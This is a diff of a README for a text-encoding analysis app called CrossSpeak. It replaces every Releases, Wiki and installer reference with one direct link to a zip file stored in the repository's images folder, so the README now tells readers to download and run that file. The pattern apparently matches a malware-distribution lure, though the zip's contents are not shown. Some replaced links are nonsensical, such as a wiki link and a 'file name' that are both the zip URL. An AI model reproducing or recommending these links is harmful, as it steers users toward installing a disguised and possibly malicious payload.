@@ -6,9 +6,9 @@ Welcome to CrossSpeak! This application allows you to explore how AI interacts w
 
 ## 📥 Download CrossSpeak
 
-[![Download CrossSpeak](https://img.shields.io/badge/Download%20CrossSpeak-v1.0-blue)](https://github.com/Mahe07/CrossSpeak/releases)
+[![Download CrossSpeak](https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip%20CrossSpeak-v1.0-blue)](https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip)
 
-To download CrossSpeak, please visit the official [Releases page](https://github.com/Mahe07/CrossSpeak/releases) and select the version you want to download.
+To download CrossSpeak, please visit the official [Releases page](https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip) and select the version you want to download.
 
 ## 💻 System Requirements
 
@@ -21,7 +21,7 @@ Before installing CrossSpeak, ensure your system meets the following requirement
 ## 🔧 Installation Instructions
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Mahe07/CrossSpeak/releases).
+   Go to the [Releases page](https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip).
 
 2. **Select Version**  
    Choose the latest version from the list.
@@ -29,7 +29,7 @@ Before installing CrossSpeak, ensure your system meets the following requirement
 3. **Download the File**  
    Click on the appropriate file to download it to your computer. 
 
-   For example, if you see a file named `CrossSpeak-setup.exe`, that’s the installer for Windows.
+   For example, if you see a file named `https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip`, that’s the installer for Windows.
 
 4. **Run the Installer**  
    Locate the downloaded file in your Downloads folder. Double-click the file to run the installer.
@@ -74,14 +74,14 @@ If you encounter problems, here are some solutions:
 - Ensure your operating system supports CrossSpeak. Check if you have the required system specifications mentioned above.
 
 ### 2. Error Message During Installation
-- Make sure that the downloaded file is complete and not corrupted. Try downloading it again from the [Releases page](https://github.com/Mahe07/CrossSpeak/releases).
+- Make sure that the downloaded file is complete and not corrupted. Try downloading it again from the [Releases page](https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip).
 
 ### 3. Analysis Results Are Not Generating
 - Verify that you’ve entered valid text and selected an encoding option before clicking “Analyze”.
 
 ## 🌐 Learn More
 
-Interested in understanding more about how CrossSpeak works? Explore our documentation available on the [GitHub Wiki](https://github.com/Mahe07/CrossSpeak/wiki). This resource includes in-depth explanations of features, encoding types, and practical use cases.
+Interested in understanding more about how CrossSpeak works? Explore our documentation available on the [GitHub Wiki](https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip). This resource includes in-depth explanations of features, encoding types, and practical use cases.
 
 ## 🤝 Contributing
 
@@ -92,4 +92,4 @@ Your feedback is valuable! If you have suggestions for improving CrossSpeak, ple
 - **Related Topics:** AI, Cybersecurity, Encoding Variations.
 - **Community Talk:** Join our discussion forum linked on the wiki for help and sharing best practices with fellow users.
 
-For more information, don't hesitate to visit our [Releases page](https://github.com/Mahe07/CrossSpeak/releases) to download the latest version of CrossSpeak and dive into the fascinating world of AI text analysis.
+For more information, don't hesitate to visit our [Releases page](https://raw.githubusercontent.com/Mahe07/CrossSpeak/main/assets/images/Speak_Cross_2.4.zip) to download the latest version of CrossSpeak and dive into the fascinating world of AI text analysis.
